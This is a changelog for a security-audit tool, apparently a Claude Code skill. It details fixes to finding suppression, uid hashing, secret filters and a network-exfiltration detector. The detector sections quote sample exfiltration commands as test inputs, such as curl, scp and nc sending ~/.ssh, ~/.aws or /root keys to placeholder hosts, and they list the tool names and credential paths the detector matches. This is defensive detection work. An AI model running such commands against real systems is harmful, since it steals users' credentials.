# membrane changelog

Named `claude-security-audit` through 0.3.1.

## 0.7.0 (2026-11-07)

#1123 (a suppressed finding was never recorded in `state.json`, so it aged out while it still fired) and #1124 (`suppress_add` took the finding's severity from its caller). Recording a finding, marking it, and reading a severity from membrane's own files are mechanical work on closed input (skill-first question 2); the step order in SKILL.md is prose.

### Changed
- **`csa suppress_add <root> <id> <note>`** (was `<root> <id> <severity> <note>`). The finding must be in `.claude/audits/state.json`'s registry, so a recorded audit produced it; its severity is the higher of the registry's value and the shipped rule's `RULE_SEVERITY`, and a missing or unrecognised severity counts as critical. Nothing the caller passes decides it, and neither does a fresh scan. The id is still a `FUID-` or a display id. Exit codes: 1 a Critical finding, a registry entry whose severity cannot be read, or a finding first seen under 60 s ago (the first and last as before); 2 no readable `state.json` (run `/security-audit` first), or a `suppressions.json` that is not one object with a `suppressions` array (an empty file is started afresh); 3 no recorded run produced the id (nothing is written, no file is created). The old four-argument form still runs; its severity argument is ignored and its fourth argument is the note.
- **`csa suppress_filter` never drops a Critical finding.** A line whose `severity` is `critical` is emitted whatever `suppressions.json` lists, and an empty or unreadable `suppressions.json` hides nothing.
- **SKILL.md step 9 records step 6's tagged output, not step 7's filtered set.** The steps now name their files: step 6 writes `<tagged>`, step 7 reads `<tagged>` and writes `<findings>`, step 9 passes `<tagged>`. Reports and chat still render the filtered `<findings>`, so suppressed findings stay hidden unless `--show-suppressed`. Before, a run with `--show-suppressed` recorded the suppressed findings and a run without it did not, so the registry depended on a display flag.
- **`csa state_record_audit` marks every finding it records `suppressed: true|false`**, computed from `suppressions.json` (membrane's own file and uids), never from the input. A listed Critical is marked `false` and counted as critical, because `suppress_filter` still shows it: the mark means the filter hides the finding in a run without `--show-suppressed`, whether or not this run passed that flag. `schema_version` stays 2; readers treat a missing mark as false. An unreadable suppressions file marks nothing. `finding_counts` counts the findings not marked suppressed, per severity, as a default run always recorded, and adds `suppressed: N`. Each sighting now also refreshes `rule_id`, `severity` and `file`; a sighting without a display id keeps the earlier `last_display_id`.
- **`csa state_record_audit`'s fourth argument may be the path of a findings file** as well as the findings themselves. A file it cannot read is exit 5, and no run is recorded.

### Fixed
- **A suppressed finding that still fires keeps its registry entry.** It counts as seen: `last_run_index` advances, so the 10-run GC does not evict it while it fires. When it stops firing it ages out like any other finding. Unsuppress it and it reads PERSISTED with its original `first_seen` (it read NEW once more than 10 runs had passed, and its entry was re-created with `first_seen` = now, which also blocked re-suppressing it for 60 s).
- **A Critical finding could be suppressed by passing another severity.** `suppress_add "$PWD" <critical-uid> medium` returned 0 and the next audit hid it. It is refused now, and so is a registry edited down to `medium` for a Critical rule (the rule's severity wins). An unknown id (`FUID-deadbeef`, `not-a-uid at all`) was accepted and is now exit 3.
- **The documented step-9 call aborted.** SKILL.md passed a findings *file* to `state_record_audit`, which took content, so the call exited 5 and wrote nothing. The function takes either, and the documented-call test now requires the call to exit 0 and record its run.

### Migration
- **Critical findings suppressed before 0.7.0 show again.** An entry in `.claude/audits/suppressions.json` for a Critical finding (made by the old `suppress_add` with a false severity, or edited in by hand) no longer hides it. The entry stays in the file; remove it with `/security-audit --unsuppress <FUID>` if you want it gone.
- **`suppress_add` takes three arguments.** The documented call is `csa suppress_add "$PWD" "<finding-id>" "<note>"`. A script that still passes `<root> <id> <severity> <note>` keeps working and its severity is ignored; a script that passed only three arguments aborted before and now works. A suppression right after upgrading needs one audit first (exit 2 or 3), because the registry is where the id is checked.
- On the first 0.7.0 audit, entries that 0.6.x had frozen for suppressed findings resume, and those it had already evicted are re-created (hidden by the filter; `first_seen` is that run).

### Known limits
- **The tamper uids (`FUID-tamper01` to `FUID-tamper03`) can no longer be suppressed**: they are never in the registry, so `suppress_add` answers exit 3. A suppression already stored for one is left alone.
- A re-created entry's `first_seen` is the upgrade date, not the original.
- History entries recorded before 0.7.0 have no `finding_counts.suppressed`.
- `--show-suppressed` still renders suppressed findings as NEW or PERSISTED: nothing produces the SUPPRESSED state the renderer supports. Not changed here.
- The unmatched-suppressions line keeps 0.6.0's rule: it is computed from the current full scan, because `audit_history` does not record whether a stored run was partial.
- Anyone who can write `state.json` can get `suppress_add` to accept a Critical: a `rule_id` with no shipped `RULE_SEVERITY` (relabelled, or deleted) leaves the registry's severity alone to decide. Editing `suppressions.json` directly also stores an entry. Neither hides a Critical, because `suppress_filter` shows every finding the scan rates critical. The tamper rules are not wired into a scan.
- **`--suppress SA-…` does not work: it exits 3** (#1133). Nothing in the skill flow assigns display ids, so the registry never holds one; before 0.7.0 the same call stored an entry that suppressed nothing. Use the `FUID-`.
- SKILL.md step 8 passes a findings file to `report_render_markdown` and `report_render_chat`, which take content (#1132). Not changed here.

### Tests
- Rows red on 0.6.1 and green now: a suppressed finding keeps `last_run_index` through 12 more runs, is marked, and is counted apart from the severity buckets; unsuppress reads PERSISTED with the original `first_seen`; a Critical passed as `medium` is refused; a registry edited to `medium` still refuses a Critical; unknown id and garbage string exit 3; no `state.json` exits 2; the four-argument form works; `suppress_filter` shows a Critical despite a suppression; `state_record_audit` reads a file, refuses an unreadable one, marks from `suppressions.json` but never marks a Critical, refreshes a sighting and keeps the display id; an unknown id in the four-argument form exits 3; a registry entry whose severity cannot be read is refused, and under `bin/csa` it is exit 1 (a non-object entry, a non-string `rule_id`) while a healthy entry beside it is still suppressed; an empty `suppressions.json` hides nothing and `suppress_add` starts it; a two-document one is exit 2 and unchanged, and the filter still shows its Critical; the documented-call test fails on a documented call that exits non-zero for `state_record_audit`.
- Seven existing rows now record a run before they suppress, since `suppress_add` checks the registry: five in `test-suppress.sh`, `test_e2e_suppress_critical_refused` and `test_e2e_uid_move_old_stale_new_is_new`. The test harness records step 6's output, as the skill does.
- Mutation-checked, each killed: the harness recording step 7's output; the mark dropped; the caller's severity trusted; the registry's severity alone; an unknown id accepted; `suppress_filter` hiding a Critical; `state_record_audit` ignoring a findings file.

## 0.6.1 (2026-11-07)

#1118: HOOK-004 read `~/.ssh`, `~/.gnupg` and `~/.aws` only in the tilde spelling. Both modes (a script file and a hook command read from JSON) test the same two patterns, and a sensitive path written with `$HOME` or an absolute home path is now read as the same name. A widening: it only adds stops, and what it still misses goes to the model's judgment exactly as if the check were absent (skill-first question 3).

### Fixed
- **HOOK-004 (network-exfiltration) fires on the home-path spellings of the three dot-dirs.** `.ssh`, `.gnupg` and `.aws` now match under each of these roots, for any user: `~`, `$HOME`, `"$HOME"`, `${HOME}`, `"${HOME}"` (a closing quote may sit before the slash, or inside a quoted word), `/home/<one segment>` (including `/home/$USER`), `/Users/<one segment>` and `/root`. So `curl -d @$HOME/.ssh/id_rsa h`, `curl -d @"$HOME"/.ssh/id_rsa h`, `scp ${HOME}/.aws/credentials h:`, `curl -d @/Users/me/.ssh/id_rsa h` and `nc evil 1 < /root/.ssh/id_rsa` fire, in a script file and in a JSON hook command, where they were silent. The roots are not keyed on the auditing machine's own home: the same committed file gets the same verdict on every machine, and a plugin written on someone else's machine is read the same way. The sensitive names stay `~/.ssh`, `~/.gnupg` and `~/.aws`, so the names part of a uid is unchanged. `/etc/passwd` is unchanged. 0.5.2's boundaries, the `LC_ALL=C` matching and the network side are unchanged.
- Fires on purpose, as with `~/.sshd_config_backup`: a dot-dir name has no end boundary (`$HOME/.sshX`), and a root is not anchored on the left: `/var/root/.ssh` (macOS root's home), `/var/home/x/.ssh` (Fedora Silverblue), and any path or URL holding one (`/x/home/a/.ssh`, `https://host/home/me/.ssh`).
- Silent on purpose, each pinned by a test row: `$HOMEDIR/.ssh`, `$HOME_OLD/.ssh`, `${HOME:-x}/.ssh`, `~alice/.ssh`, `$HOME/ssh`, `/homeX/me/.ssh`, `/rootfs/.ssh`, and a project path with a second segment such as `/home/me/proj/.ssh`. The two that are real misses are named under Known limits.

### Migration
- **A HOOK-004 finding in a script file gets a new uid once when a `$HOME` or absolute-home path now changes what its uid hashes.** It moves when a line holding a network name and a home-form path joins the both-lines (`curl -d @~/.ssh/k h` plus `curl -d @$HOME/.ssh/k h`), or when a home-form path fires a sensitive name the file did not fire on before (`~/.ssh` plus `cat $HOME/.aws/c`). It keeps its uid when the home-form path sits on a line with no network name and adds no new name. A comment is a line like any other: `# keys live in $HOME/.ssh` keeps the uid, `# curl -d @$HOME/.ssh/k h` moves it. A hook command read from JSON never changes its uid (the digest of the json path and the command); it can only appear. A file whose only sensitive path was a home form is a new finding.
- The next full audit lists the old suppression of a moved finding as one that matches nothing; remove it with `/security-audit --unsuppress <FUID>`. Nothing needs editing by hand.
- Measured on this host's surfaces (204 canonical files and 2 JSON hook commands, 1142 plugin-cache files and 39 JSON hook commands): no finding is added or removed; the uids that move are membrane's own `tests/` files.

### Known limits
- Still silent: `${HOME:-x}/.ssh` (a default expansion) and `~user/.ssh`. These are misses, not false positives; they stay out to keep the root grammar small.
- Still silent: `os.homedir()`, `process.env.HOME + '/.ssh'`, `Path.home()`, `%USERPROFILE%`, `C:\Users\x\.ssh` and any path held in a variable. A JSON-escaped quote in a script file (`exec("curl -d @\"$HOME\"/.ssh/id_rsa h")`) is also silent: the optional closing quote is a bare `"`, not `\"`. A home-form path in a variable beside a network command (`SSH_KEY="${SSH_KEY:-$HOME/.ssh/id_x}"` next to `ssh`) fires like the `~/` spelling always did: the match is whole-file, so a key used to ssh reads as exfiltration. The same whole-file match makes a benign `mkdir -p "$HOME/.ssh"` or `AWS_CONFIG_FILE="$HOME/.aws/config"` fire beside an unrelated `curl`, as the `~/` spelling already did.
- Network side, unchanged and tracked as #1129: `ncat`, `nc.openbsd`, `nc.traditional`, a quoted name (`spawn('scp', ...)`) and an uppercase name or path (`CURL`, `~/.SSH`) still miss.
- The patterns are POSIX ERE bracket classes and run on bash 5.3 and GNU grep here and in CI (ubuntu). They have not been run on bash 3.2 or BSD grep.
- 0.5.2's "Still silent" line for `$HOME/.ssh`, `${HOME}/.ssh`, `"$HOME"/.ssh` and `/Users/<name>/.ssh` is history: they fire from 0.6.1.

### Tests
- `tests/test-network-exfil-patterns.sh`: the 14 home-path forms (`$HOME`, `${HOME}`, quoted, `/Users/x`, `/home/x`, `/home/$USER`, `/root`, across all three dot-dirs, a split form and a JS template literal) each in file mode and JSON mode, red on 0.6.0; four fires-on-purpose rows (`$HOME/.sshX`, `/var/root/.ssh`, `/var/home/x/.ssh`, `https://host/home/me/.ssh`), red on 0.6.0 too; twenty silent lookalikes (including `${HOME:-x}`, a second-segment `/Users` path, a left-anchor control for each absolute root, and a segment that is empty or holds a space) as controls, which pass on 0.6.0 and now. The row that pinned `$HOME` silent keeps only `ncat`.
- `tests/test-uid-long-text-callers.sh`: the `$HOME/.ssh raises no finding` row now fires, with `${HOME:-x}` as the silent control; the regex pin names the root group and derives each `~/` alternative from it by hand; a new test pins five literal uids computed with `sha256sum`, in seven rows: the baseline, three ways the uid is kept and three ways it moves, plus a comment holding a network name, which moves it.
- `tests/test-hook-entries.sh`: detect and detect_text parity gains four home-path inputs, two of which fire and two stay silent; it checks that both modes agree, so it passes on 0.6.0 too.
- Mutation-checked: one root dropped, the optional closing quote dropped on each of `$HOME` and `${HOME}`, `<one segment>` allowed to span a `/`, `/root` dropped and `$HOME` made to match `$HOMEDIR` are each killed. `/srv/chroot/.ssh`, `/srv/myhome/x/.ssh` and `/srv/MyUsers/x/.ssh` stay silent, so a root that loses its leading `/` is killed by a behaviour row as well as by the regex pin; so are a segment allowed to be empty or to hold a space.

## 0.6.0 (2026-11-07)

#1112: nothing removed a suppression, and nothing said which ones had stopped matching. Both are mechanical work on membrane's own state file and the uids it mints (skill-first question 2). The code never deletes on its own: whether to drop a listed entry stays the operator's call.

### Added
- **`/security-audit --unsuppress <FUID>`** removes one suppression from `.claude/audits/suppressions.json` (`csa suppress_remove <root> <uid>`). Every other entry is kept as it was. An unknown uid exits 1 and the file is not rewritten; a file that is not a suppressions file (empty, not JSON, no `suppressions` array) exits 2; no file exits 1 and none is created. A failed write exits 5 with a `csa:` message and leaves the file as it was. The write is atomic, as `--suppress` is.
- **A full audit lists suppressions that match nothing.** (`suppress_stale` prints `{"finding_uid": …}` only, never a `note`, and the skill prints only uids of the form `FUID-` and 8 hex digits.) After a full audit (no focus) whose scan exited 0 with no `csa: warning` line and holds no `SCANNER-*` or `PROVENANCE-002` finding, chat gets one line naming the suppressions whose uid is not in the scan, with a reminder that they may still be wanted (another branch, a disabled plugin) and how to remove one. `csa suppress_stale <raw-findings> <root> <focus>` computes it from the raw scan output of that run, before suppressions are filtered out, and refuses on a focused scan or a malformed suppressions file (exit 2), a scan with a `SCANNER-*` or `PROVENANCE-002` finding (exit 3), or a findings file that is missing or not JSONL (exit 4). The skill runs it only after a scan that exited 0 with no `csa: warning` line, because a failed scan prints no findings and the function cannot see that. Stored runs cannot answer it, because a suppressed finding is filtered out before the run is recorded.

### Fixed
- SKILL.md documented `csa suppress_add "<finding-id>"`, `csa suppress_filter <findings>`, `csa baseline_tag <findings>` and `csa apply_resolve_id "<id>"`, each of which aborts through the dispatcher (`$2: unbound variable`); `csa state_bootstrap_gitignore`, `csa report_render_markdown`, `csa report_render_chat` and `csa state_record_audit` were documented with no arguments and aborted the same way. Each now documents its real arguments, and a test runs every `csa` call SKILL.md documents through `bin/csa`, bare calls included.

### Migration
- The dead suppression entries that 0.5.0, 0.5.1 and 0.5.2 left (a uid that moved, or a finding that stopped firing) are listed by the next full audit; remove each with `/security-audit --unsuppress <FUID>`. The entries under those versions below that say to edit the file by hand are left as written.

### Known limits
- The list never includes the three fixed tamper uids (`FUID-tamper01` to `FUID-tamper03`): the tamper check is not part of the rule-engine scan, so they never appear in one. A suppression of one of them stays until `--unsuppress` removes it.
- A partial scan that exits 0 and prints no `SCANNER-*` or `PROVENANCE-002` finding is only caught by the `csa: warning` line the skill checks; the function does not see stderr.
- Adding and removing a suppression take no lock, so concurrent calls can lose an update (as `--suppress` always could).
- The list says "matches nothing in this scan", not "dead": a branch switch, a disabled plugin or another `HOME` also leaves an entry unmatched, and nothing is removed for you.
- `--unsuppress` takes the id as stored in `suppressions.json`, matched exactly; it does not resolve a display id (a suppressed finding is not in the report).

## 0.5.2 (2026-11-06)

#1113: HOOK-004's patterns matched more than they named. Both modes (a script file and a hook command read from JSON) test the same two patterns, and a detection that fired on an incidental token is now silent. A narrowing: it only removes stops, and what it misses goes to the model's judgment exactly as if the check were absent (skill-first question 3).

### Fixed
- **HOOK-004 (network-exfiltration) no longer fires on 15 inputs that were not a network command beside a sensitive path.** A network name now needs a boundary before it: the start of the text, a byte that is not a letter, digit, `_`, `.` or `-`, or a backslash and `n`, `r` or `t` (the escaped newline, CR or tab inside a JSON or JS string or a `$'...'` word, so `"set -e\ncurl ..."` still fires). So `async `, `sync ` and `func ` no longer read as `nc `, `openssh ` as `ssh `, `.curlrc`, `.wgetrc` and `pycurl` as `curl` or `wget`, and `~/.ssh ` (as in `chmod 700 ~/.ssh && echo ok` or `cp ~/.ssh /backup`) no longer names `ssh` after itself. `curl`, `wget` and `rsync` also need a non-letter or the end of the text after them, so `curly`, `curling`, `curlrc`, `wgetrc` and `rsyncd` do not fire; `curl.exe`, `wget2`, `curl_chrome116` and `curl-x` still do. `nc`, `ssh` and `scp` still need whitespace after them (so `ssh-keygen` and `ssh-add` still do not fire). The dots of the sensitive paths are escaped, so `~/Xssh/k` and `~/` newline `ssh` are no longer `~/.ssh`. `/usr/bin/curl`, `/bin/nc`, `$(curl`, a backtick, a quote, a backslash or a `|` before a name still count. Detection stays whole-file in file mode, so the split form (`F=~/.ssh/known_hosts` then `curl -d @"$F" host`) still fires. 0.5.1's Known limit about incidental tokens is closed for these tokens.
- **Detection and both parts of the uid are locale-free.** The matching (`_csa_hook004_match`, which `detect` and `detect_text` call) and `_csa_hook004_excerpt` run under a local `LC_ALL=C`, and nothing else does, so a JSON-mode preview is still cut by characters as in 0.5.1. The same bytes give the same verdict and the same uid in every locale. `nc` followed by an em space, which fired under a UTF-8 locale and not under `C` in 0.5.1, now fires in neither (the shell splits words on space, tab and newline). Measured on bash 5.3: bash 3.2's restore of a function-local `LC_ALL` is unverified.
- The names are their own arrays and each pattern is built from its name, not the other way round, so a file that fires on the same names and the same both-lines keeps its 0.5.1 uid byte for byte (the literal pins in `tests/test-uid-long-text-callers.sh` still hold, and `FUID-55e7bc9a` is unchanged).

### Migration
- **A HOOK-004 finding in a script file gets a new uid once when its names or its both-lines included an incidental token that no longer counts.** Measured, each moves: a file with `rsync ` (it stops naming `nc`), `async ` or `sync ` (`nc`), a Go `func ` (`nc`), `openssh ` (`ssh`), `.ssh ` as in `chmod 700 ~/.ssh ` (`ssh`), a both-line that held `.curlrc` (the line leaves the digest), and a file with `nc` then an em space when the audit runs under a UTF-8 locale (it now matches the `C` uid). A file that still fires on a real `nc `, `ssh ` or `curl` keeps its uid: an `rsync` script that also pipes to `nc`, an `async` hook that also runs `nc`, and a file with only a real `curl` keep theirs. Every finding whose names and both-lines held none of those keeps its 0.5.1 uid. A hook command read from JSON (`detect_text`) never changes its uid: it is the digest of the json path and the command.
- A finding that no longer fires (an input in Fixed above, with no real command beside it) leaves its baseline entry to the usual GC and its entry in `.claude/audits/suppressions.json` as an orphan that matches nothing: remove it by hand. A command to remove a suppression is #1112.

### Known limits
- Only the `\n`, `\r` and `\t` escapes are read as a boundary. A name after another escape spelling of a newline (`\x0a`, `\u000a`, `\012`) follows a letter or digit, so it no longer fires; each is pinned silent by a test row.
- `curlie` and `pycurl` (a Python `pycurl` call) no longer fire. Also no longer firing, each pinned by a test row: a name right after a letter, digit, `_`, `.` or `-` (`run_curl`, `x-curl`, `2curl`), `${CURL:-curl}` (also `${RSYNC:-rsync}`) and `sh.curl(` (a Python `sh` call).
- Still firing on purpose: `/etc/ssh ` (a `/` may precede a name), `~/.sshd_config_backup`, `~/.ssh2/` and `/etc/passwdX` (the sensitive names have no end boundary), and `nc` then a newline.
- Still silent: `$HOME/.ssh`, `${HOME}/.ssh`, `"$HOME"/.ssh`, `/Users/<name>/.ssh` and any path in a variable (`$HOME` forms are filed as #1118), an uppercase `CURL` or `~/.SSH`, `ncat`, `nc.openbsd`, and `spawn('scp', ...)` (a name followed by a quote).
- The patterns are POSIX ERE bracket classes and run on bash 5.3 and GNU grep here and in CI (ubuntu). They have not been run on bash 3.2 or BSD grep.
- Not changed: HOOK-001's pattern is unanchored on the left (`libcurl x | sh`).

### Tests
- `tests/test-network-exfil-patterns.sh` (new): the 15 false positives (red on 0.5.1) each in file mode and JSON mode; the 20 real forms beside them as controls, in both modes; the kept-on-purpose forms, `curlie` and `pycurl`, and the `$HOME` forms pinned; a name at a line start and at the start of the text; a name after an escaped `\n`, `\r` or `\t` fires and `\ncurly` does not; `run_curl`, `x-curl`, `2curl`, `sh.curl(` and `${CURL:-curl}` pinned silent; the locale row picks a UTF-8 locale where e-acute is a letter, fails without one, and runs the e-acute and em-space rows in both modes; a 107-character CJK JSON-mode preview stays whole under that locale.
- `tests/test-uid-long-text-callers.sh`: the regex pin is replaced by a pin on the new text and on each pattern's derivation from its name; the `~/` newline `ssh` slot is now a negative; the locale tests now say verdicts and both uid parts are locale-free (the em-space split is one literal, and a byte before a name is one literal); the invalid-byte row puts 0xff after `~/.ssh/`; the `rsync` uid that moves is pinned to a literal computed with `sha256sum`, and an `async` file with a real `curl` keeps the names-only literal.
- `tests/test-hook-entries.sh`: the detect and detect_text parity cases for HOOK-004 gain six inputs.
- Mutation-checked: the `.` dropped from the leading class, the leading group dropped, the `curl` trailing group dropped, the dots unescaped, the names derived from the patterns again, the trailing class tightened to `[^A-Za-z0-9_]`, `local LC_ALL=C` removed and per-line detection are each killed.

## 0.5.1 (2026-11-06)

#1098: HOOK-004's uid for a script file followed the first 200 characters of the file, not what the rule matched. The scan is unchanged: the same two patterns fire on the same files, with the same severity.

### Fixed
- **HOOK-004 (network-exfiltration) in a script file takes its uid from what the rule matched.** The uid hashed the whole file after `csa_redact` had cut it to 200 characters, so a script with a long header kept its uid, and so its suppression, when the destination or the key file changed or a second command was added after character 200, while a one-word edit to a comment inside the first 200 characters gave it a new uid. The uid now hashes the names of the alternatives that fire (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`; `~/.ssh`, `~/.gnupg`, `~/.aws`, `/etc/passwd`) plus, when some line holds both a network match and a sensitive match, the sha256 of those lines (the line bytes kept exact: a trailing CR dropped, leading and trailing spaces and tabs trimmed, byte-sorted without duplicates), through `csa_finding_uid_raw`. It moves when a command name or a sensitive root not already present is added or removed, and when such a line changes (destination, key file, flags, or any whitespace inside the line: a double space or a tab inside a quoted word reads NEW, the safe direction). A second line with a name already present moves it only if that line holds both matches. It keeps through indentation, trailing spaces, a CRLF ending, whitespace in a line that holds no both-match, a comment or other line that adds no name and holds no both-match, a repeated line and the order of two lines. The regexes are the alternatives joined, and each name is derived from its alternative, so a name cannot be dropped or shifted apart from the alternative it names. The line part runs under `LC_ALL=C` and does not depend on the locale; the names part follows the locale, as `detect` does (an em space after `nc` fires `nc` under a UTF-8 locale and not under `C`, so that file has a different uid in the two). The preview is still the constant, and the line text reaches only `sha256`. A hook command read from JSON (`detect_text`) is unchanged and keeps its uid. Skill-first: the names are question 2 (membrane's own fixed alternatives); the line part reads open text but can only split a uid relative to the names, so what it mishandles either reads NEW (a quote change: an extra stop) or adds nothing and leaves the uid on the names (a split command, a variable, a newline in a regex slot). The excerpt is built from one test per alternative and one pass over the lines, with no loop over matches.

### Migration
- **Every HOOK-004 finding in a script file gets a new uid once**, not only those over 200 characters, so each reads NEW in the next audit and must be suppressed again. HOOK-004 read from `.claude/settings.json`, `.claude/settings.local.json`, or an enabled plugin's `hooks/hooks.json` or `.claude-plugin/plugin.json` keeps its uid; any other file under `.claude/hooks/`, JSON included, is a script file and moves. As in 0.5.0, the old baseline entry (`state.json` findings registry) is evicted by the usual GC, and an old `suppressions.json` entry is not: edit `.claude/audits/suppressions.json` by hand to remove it, since it matches nothing from now on. A command to remove a suppression is #1112.

### Known limits
- Whenever no single line holds both matches (a command split across lines, a path in a variable such as `F=~/.ssh/known_hosts` then `curl -d @"$F" host`, data staged through a file or a pipe), the uid keys on the names only: changing the destination does not move it.
- Quoting is not normalised: `-d @~/.ssh/x` and `-d "@~/.ssh/x"` are two lines and two uids.
- The patterns have open slots (`.` matches any character, nothing is anchored), and the names inherit them: an incidental token such as `sync `, `async ` or `curly` fires `nc` or `curl`, adds a name and can move the uid. What the patterns match is unchanged and is filed as #1113.

### Tests
- `tests/test-uid-long-text-callers.sh`: HOOK-004's old pin (an edit past character 200 keeps the uid) is replaced. A changed destination and key file past character 200, a second root past 200, and a both-line over 200 characters that differs after 200 each move the uid; a comment edit inside the first 200, whitespace, an unrelated line, a repeated line (also spaced differently) and the order of two lines keep it; `~/.sshd_config_backup` moves it and `$HOME/.ssh` raises nothing; each of the 10 alternatives, `nc` then a newline and `~/` newline `ssh` give a uid pinned to a literal computed with `sha256sum`; the split command's uid is the names-only literal; the two regexes equal their 0.5.0 text; the output carries no line text; 20000 matching lines finish inside 20 seconds. Round 0 of the pre-PR review added: one line holding two commands joined by a 0x1f byte differs from the two-line file; two lines differ from one line holding both commands; an em space and an invalid byte in the `.` slot give one uid under `C` and under a UTF-8 locale; the sort is byte order under a UTF-8 locale that collates `a` before `B` (a literal pin; the test fails if no such locale is installed); a both-line with 0xff counts; indented and CRLF both-lines keep the flush LF uid. The short-script pin is now `FUID-dd90631c`, and `network-exfiltration.sh` leaves the list of files that call `csa_finding_uid`.
- PR round 1: whitespace inside a both-line moves the uid (a double space and a tab inside a quoted word, `\f` and `\v` between words); indentation, trailing spaces and tabs and a CRLF ending keep it; the names differ for an em space after `nc` between `C` and a UTF-8 locale (pinned as a documented property). The short-script pin is now `FUID-55e7bc9a` and the sort pin `FUID-2588313f`; names-only uids are unchanged.
- Mutation-checked: the plain `csa_finding_uid`, a dropped alternative (either side), a dropped or wrong name, `sort -u` removed, the inner squeeze restored, the CR strip, either trim or the digest removed, the names part dropped, the line part dropped, the second `grep` dropped, and the `&&` in the read-error predicate (`tests/test-fail-closed-readers.sh`) are each killed.

## 0.5.0 (2026-11-05)

#1034 (the real-run report buried its signal) and #1072's C11 (a crafted finding could share a suppressed finding's uid), shipped together on the operator's ruling of 2026-11-05. The scan is unchanged: plugin `fixtures/` and `tests/` and `.dagr/scratch/` copies are still scanned, and every finding keeps its severity, state and count.

### Changed
- **Chat folds plugin test files and agent scratch copies into one count line.** A finding whose file is under an enabled plugin's `fixtures/` or `tests/` (a directory segment anywhere in the path inside the plugin's tree, as the `@plugin:<plugin>@<marketplace>:<rest>` id shows it) or under the project's own `.dagr/scratch/` is not listed in chat. One line replaces them, after the table: `N findings in plugin fixtures/tests and agent scratch copies (C critical, H high, M medium); listed in the report` (`, L low`, `, I info` and `, N other` (a finding with no or an unknown severity) follow when not zero; `1 finding` in the singular). It prints when the group holds only Info, counts non-suppressed findings, and prints nothing for an empty group. The headline total and the table count every finding, as before. A project's own `tests/` or `fixtures/` is not in the group, nor is a file merely named `tests`, nor a plugin outside the `cache/` layout (a `local/` plugin): those stay listed. `--verbose` lists the group in full and prints no count line. The markdown report lists every group finding at full severity with a `**Group:**` line (`plugin fixtures/tests` or `agent scratch`).
- **Findings from the free-text rules get a new uid once (C11).** `csa_finding_uid` hashes the excerpt after `csa_redact`, which caps it at 200 characters and masks every secret-like run to its first and last four, so two long matches that shared their first 200 characters, or their masked form, shared a uid. The rules whose excerpt is a grep line or a JSON value now call the new `csa_finding_uid_raw`, which hashes the whitespace-squeezed excerpt itself. The raw excerpt reaches only `sha256` and is never printed or stored; the uid keeps 8 hex characters. `csa_finding_uid` is unchanged and keeps serving the callers whose excerpt is a constant, a rule-written string or a fixed-length digest: a hook command read from JSON (HOOK-001 to HOOK-004 on a settings or plugin file; the digest of its json path and command), HOOK-005, HOOK-006, PERM-002, PERM-004 and MARKETPLACE-002; and HOOK-004's file mode (`network-exfiltration`), a file-level rule whose excerpt is the whole file and whose uid already holds the rule and the file, so there is one finding per file and an edit past character 200 keeps its uid (the raw form would hash the whole script and move it on every edit). That stability is also C11's harm, as in 0.4.2: a suppression made for a network-exfiltration finding still covers the script after an edit past character 200. Of the 26 call sites in `lib/`, 19 moved to the raw form (listed under Migration) and 7 did not.
- **SKILL.md step 5 says what is true about uids.** 0.4.2's step 5 told the model to compute a `finding_uid` per scanner finding with `csa finding_uid`, which would now re-key the 19 raw-uid rules by their redacted form. It now says rule findings carry their durable uid (the rule computes it; do not recompute it) and SCANNER findings carry none, so they are reported on every run and not registered.

### Fixed
- **SECRETS-004 no longer reports a pure-hex run or a slash-heavy path.** A match is `[A-Za-z0-9+/]{40,}` with up to two `=`; it is now skipped when the whole run is `[0-9a-fA-F]+` (a git SHA, a sha256 digest) and its line names no credential (case-insensitive `token`, `secret`, `passw`, `api_key`/`api-key`/`apikey`, `auth`, `credential`, `private_key`/`private-key`), or when it holds two or more `/` and every `/`-separated segment is a word shape (`[A-Z]?[a-z0-9]+` or `[A-Z0-9]+`, so no `+` and no `=`): `pulsestack/actions/runs/41344090802/rerun`, `ROOT/skills/orchestrate/references/roles`. A line is dropped only when every run on it is skipped. The AWS documentation secret key `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` has two slashes but mixed-case segments, so it is still reported, as are a blob with `+` or `=`, a long blob with no slash, a run with one slash, a path with a camelCase or multi-capital segment, and a hex run on a line that names a credential (`"github_token": "<40 hex>"`). Known limits: a hex credential on a line with no credential word is no longer reported (`dop_v1_<64 hex>` with no `token` beside it); SECRETS-003 still reports `NAME=value` when the name holds API_KEY, SECRET, TOKEN or PASSWORD, and a JSON- or YAML-keyed hex token has no other rule. `sk-...`, `ghp_...` and `AKIA...` keys are not hex and are unaffected (SECRETS-001; a JWT is SECRETS-002). A placeholder of only `A` to `F` characters (`AAAAAAAA...`) is hex and is skipped unless its line names a credential. In a path, a Capitalized, UPPER-case or digit segment is a word shape, so a documentation webhook URL with `XXXX` segments is skipped, and so is a base32 or hex token that sits as a segment between slashes (`.../webhooks/<32 hex>`). If the filter cannot run, the unfiltered findings are reported. Skill-first question 3: the scanner is a stop-only rail; a narrower pattern changes which stops it adds, and it still never approves anything. Each shape is pinned beside a control it must not skip.

### Migration
- **One-time uid change, so suppressions and baseline entries read NEW once.** A finding from a rule below whose excerpt is over 200 characters, or holds a run that `csa_redact` masks (a secret-shaped value, or 32 or more characters of `A-Za-z0-9+/=`), has a new uid; for SECRETS-001 to SECRETS-004, CLAUDE-MD-001 and MCP-003 that is nearly every finding. Its old suppression or baseline entry no longer matches: it reads NEW in the next audit, and must be suppressed again. The old baseline entry (`state.json` findings registry) is evicted by the usual GC. A `suppressions.json` entry for the old uid is not: GC does not touch that file, and the plugin has no command to remove an entry, so it stays there matching nothing until you edit `.claude/audits/suppressions.json` by hand. Rules: HOOK-001 to HOOK-003 (findings in script files; a hook command read from JSON keeps its uid, and HOOK-004 keeps its uid in both modes), PROMPT-INJ-001, PROMPT-INJ-002, SECRETS-001 to SECRETS-004, CLAUDE-MD-001, CLAUDE-MD-002, MCP-001 to MCP-003, MARKETPLACE-001, PERM-001, PERM-003, PERM-005 and PROVENANCE-002. A short finding with nothing to mask, from any rule, keeps its uid byte for byte. A secret that is rotated now reads NEW, since the uid hashes the secret's line. This is by design: a suppression covers one secret, not a position.
- A SECRETS-004 finding that the new filter skips disappears from the next report: its baseline entry is evicted by the usual GC.

### Tests
- `tests/test-fingerprint.sh`: `csa_finding_uid_raw` for two excerpts that differ only after character 200 and only under a masked run (each beside the unchanged `csa_finding_uid`, which still collides), whitespace, equality with `csa_finding_uid` for a plain short excerpt, nothing but the uid on stdout and stderr; `csa_finding_uid` pinned to 0.4.2 values.
